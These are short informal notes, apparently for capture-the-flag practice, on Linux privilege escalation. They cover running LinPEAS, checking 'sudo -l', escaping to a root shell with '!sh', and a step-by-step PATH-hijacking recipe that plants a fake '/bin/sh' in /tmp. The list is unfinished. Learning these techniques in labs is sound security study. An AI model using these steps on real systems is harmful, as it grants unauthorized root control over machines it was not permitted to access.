USE LINPEAS!!!!!!!!!!!!!!!

////////////////////////////////////////////////////////////////////////////

~Check what command you are able to run as sudo 

$ sudo -l 

~then if it says you can run a command as sudo, run the command, example systemctl status. Then when in there, give the comment to spawn root shell 

$ !sh 

$ whoami

/////////////////////////////////////////////////////////////////////////////

If there is no sudo privileges at all. 
1. You can check what groups the user is in.
2. If part of a unique group like 'bugtracker', run locate to see if a binary exists.
3. check out the binary, and if it can run things as elevated do next step
4. go to /tmp folder and create a file with the contets :     /bin/sh
5. Then change permisssion on that file:  chmod +x
6. Then add /tmp to PATH variable to make it an executable run-able directory: export PATH=/tmp:$PATH
7. Run the vulnurable binary from that directory and try to locate root folder
8. 
-